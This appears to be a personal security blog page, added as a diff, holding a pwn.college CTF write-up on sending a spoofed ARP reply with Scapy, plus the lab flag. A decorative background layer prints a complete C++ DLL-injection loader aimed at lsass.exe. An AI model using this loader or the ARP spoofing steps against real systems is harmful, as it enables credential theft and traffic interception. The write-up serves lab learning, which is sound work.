@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🧠 CTF Writeup: Manual ARP Packet Injection</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="🧠 CTF Writeup: Manual ARP Packet Injection" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>🧠 CTF Writeup: Manual ARP Packet Injection</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <h2 id="-task">📜 Task</h2>
+
+<p>Manually send an Address Resolution Protocol (ARP) packet.<br />
+The packet should inform the remote host that the IP address <code class="language-plaintext highlighter-rouge">10.0.0.42</code> is associated with the Ethernet (MAC) address <code class="language-plaintext highlighter-rouge">42:42:42:42:42:42</code>.<br />
+Send this spoofed packet to the host at <code class="language-plaintext highlighter-rouge">10.0.0.2</code>.</p>
+
+<hr />
+
+<h2 id="️-tools--environment">🛠️ Tools &amp; Environment</h2>
+
+<ul>
+  <li><strong>Tool Used</strong>: <a href="https://scapy.net/">Scapy</a> (version 2.6.1)</li>
+  <li><strong>Target IP</strong>: <code class="language-plaintext highlighter-rouge">10.0.0.2</code></li>
+  <li><strong>Fake IP</strong>: <code class="language-plaintext highlighter-rouge">10.0.0.42</code></li>
+  <li><strong>Fake MAC</strong>: <code class="language-plaintext highlighter-rouge">42:42:42:42:42:42</code></li>
+  <li><strong>Interface</strong>: <code class="language-plaintext highlighter-rouge">eth0</code></li>
+</ul>
+
+<hr />
+
+<h2 id="-steps--solution">🧪 Steps &amp; Solution</h2>
+
+<h3 id="-step-1-identify-mac-address-of-target-host">🔍 Step 1: Identify MAC address of target host</h3>
+
+<p>We use a Python script (<code class="language-plaintext highlighter-rouge">mac_3.py</code>) to get the MAC address of the host at <code class="language-plaintext highlighter-rouge">10.0.0.2</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-0-0-1:~# python mac_3.py
+ip:10.0.0.2
+IP: 10.0.0.2 - MAC: 16:db:11:82:36:73
+</code></pre></div></div>
+
+<h3 id="step-2-open-scapy">Step 2: Open Scapy</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-0-0-1:~# scapy <span class="nt">-H</span>
+Welcome to Scapy <span class="o">(</span>2.6.1<span class="o">)</span> using IPython 8.29.0
+</code></pre></div></div>
+
+<h3 id="step-3-craft-and-send-the-arp-packet">Step 3: Craft and send the ARP packet</h3>
+<p>We craft a spoofed ARP reply indicating that 10.0.0.42 has MAC 42:42:42:42:42:42, and send it to the host at 10.0.0.2:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> pkt <span class="o">=</span> Ether<span class="o">(</span><span class="nv">dst</span><span class="o">=</span><span class="s1">'ff:ff:ff:ff:ff:ff'</span><span class="o">)</span>/ARP<span class="o">(</span>
+...     <span class="nv">op</span><span class="o">=</span>2,
+...     <span class="nv">psrc</span><span class="o">=</span><span class="s1">'10.0.0.42'</span>,
+...     <span class="nv">hwsrc</span><span class="o">=</span><span class="s1">'42:42:42:42:42:42'</span>,
+...     <span class="nv">pdst</span><span class="o">=</span><span class="s1">'10.0.0.2'</span>,
+...     <span class="nv">hwdst</span><span class="o">=</span><span class="s1">'16:db:11:82:36:73'</span>
+... <span class="o">)</span>
+<span class="o">&gt;&gt;&gt;</span> sendp<span class="o">(</span>pkt, <span class="nv">iface</span><span class="o">=</span><span class="s2">"eth0"</span><span class="o">)</span>
+<span class="nb">.</span>
+Sent 1 packets.
+</code></pre></div></div>
+<hr />
+<h2 id="flag">Flag</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college<span class="o">{</span>c8CRYUHAQYu8uY0dwMH5e2-eBE8.QXwczMzwSM0IzMyEzW<span class="o">}</span>
+</code></pre></div></div>
+<hr />
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
